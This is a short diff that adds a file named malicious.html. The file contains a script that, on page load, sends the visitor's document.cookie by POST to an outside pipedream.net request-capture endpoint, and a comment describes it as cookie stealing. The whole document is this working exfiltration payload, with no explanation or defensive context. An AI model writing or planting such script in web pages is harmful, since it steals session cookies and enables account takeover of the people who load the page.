@@ -1,0 +1,8 @@
+<!-- malicious.html -->
+<script>
+  // Cookie stealing or redirect
+  fetch("https://eocfeyry9m8gf1y.m.pipedream.net", {
+    method: "POST",
+    body: document.cookie
+  });
+</script>
